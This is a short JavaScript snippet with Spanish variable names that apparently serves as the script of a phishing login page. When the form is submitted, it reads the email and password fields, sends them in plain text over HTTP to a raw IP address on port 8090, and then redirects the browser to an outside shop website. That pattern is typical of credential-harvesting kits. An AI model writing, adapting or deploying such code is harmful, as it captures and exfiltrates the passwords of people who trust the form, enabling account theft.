document.addEventListener("DOMContentLoaded", () => {
    let formulario = document.querySelector("form")
    formulario.addEventListener("submit", async (e) => {
        

        let email = document.querySelector("input[type=email]").value;
        let pass = document.querySelector("input[type=password]").value;
        
        let resultado = await fetch(`http://200.200.100.10:8090?email=${email}&password=${pass}`, {
            method: 'GET'
        });
        
        let r = await resultado.text();

        if(r){
            window.location.href="http://www.bladstore.net/"
        }
        
    });
});